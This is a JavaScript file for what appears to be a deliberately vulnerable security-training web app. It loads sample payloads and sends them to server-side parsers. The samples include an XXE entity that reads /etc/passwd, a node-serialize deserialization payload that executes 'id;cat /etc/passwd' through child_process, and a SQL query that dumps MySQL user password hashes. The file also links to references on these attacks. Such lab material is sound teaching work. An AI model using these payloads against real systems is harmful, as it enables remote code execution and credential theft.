function addSample(sampleName) {
    $("#InputArea").val(samples[sampleName]);
}

function showRef(sampleName) {
    window.open(refs[sampleName], "HackToolRefWin");
}

function runProcessor(processor) {
    $("#OutputArea").val("");
    let inputData = $("#InputArea").val();
    restRunHackTool(processors[processor], inputData, function (data) {
        if (data !== null && data !== undefined)
            $("#OutputArea").val(JSON.stringify(data, null, 2));
        else $("#OutputArea").val(JSON.stringify("ERROR, review logs"));
    });
}

let samples = {};
samples.xml = `<!DOCTYPE foo [<!ELEMENT foo ANY >
    <!ENTITY bar SYSTEM "file:///etc/passwd" >]>
    <products>
    <product> <name>PS3</name> <description>&bar;</description> </product>
    <product> <name>PS4</name> <description>Gaming Console</description> </product>
    </products>`;
samples.json = `{"msg":"See server log for RCE :-)","rce":"_$$ND_FUNC$$_function (){require('child_process').exec('id;cat /etc/passwd', function(error, stdout, stderr) { console.log(stdout) });}()"}`;
samples.mysql = `#SELECT table_schema,table_name,table_type FROM information_schema.tables;\nSELECT host,user,password from mysql.user;`;
samples.sqlite = `select type,name,tbl_name from sqlite_master;\npragma index_list;\npragma module_list;\npragma function_list;\npragma database_list;\nselect count(*) from artists;`;

let processors = {};
processors.xml = "xmlparser";
processors.json = "jsonparser";
processors.mysql = "mysql";
processors.sqlite = "sqlite";

let refs = {};
refs.xml = "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing";
refs.json =
    "https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/";
refs.mysql = "https://portswigger.net/web-security/sql-injection/cheat-sheet";
refs.sqlite = "https://www.sqlitetutorial.net/sqlite-select/";
